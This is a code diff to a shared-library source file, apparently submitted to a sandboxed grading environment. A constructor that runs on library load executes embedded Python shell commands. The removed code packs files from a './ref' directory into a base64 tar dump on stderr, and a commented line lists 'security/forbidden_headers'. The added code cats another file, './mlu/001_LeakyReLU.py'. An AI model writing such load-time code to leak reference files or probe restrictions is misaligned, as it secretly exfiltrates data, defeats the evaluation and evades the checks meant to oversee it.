@@ -73,26 +73,9 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-# run_cmd(['ls','-R','security/forbidden_headers'])
-# print("_" * 30)
+run_cmd(['cat','./mlu/001_LeakyReLU.py'])
+print("_" * 30)
 
-dir_path = "./ref"
-root = Path(dir_path).resolve()
-
-buf = BytesIO()
-
-with tarfile.open(fileobj=buf, mode="w:xz") as tf:
-    for i, p in enumerate(root.rglob("*.py")):
-        if p.is_file() and i in range(100,150):
-          tf.add(p, arcname=p.relative_to(root.parent))
-
-
-print(f"Size:{len(buf.getvalue())}")
-encoded = base64.b64encode(buf.getvalue()).decode("ascii")
-print("@@TAR_BASE64_BEGIN@@", file=sys.stderr)
-for line in textwrap.wrap(encoded, 512):
-    print(line, file=sys.stderr)
-print("@@TAR_BASE64_END@@", file=sys.stderr)
 )PY");
 
   PyGILState_Release(gstate);
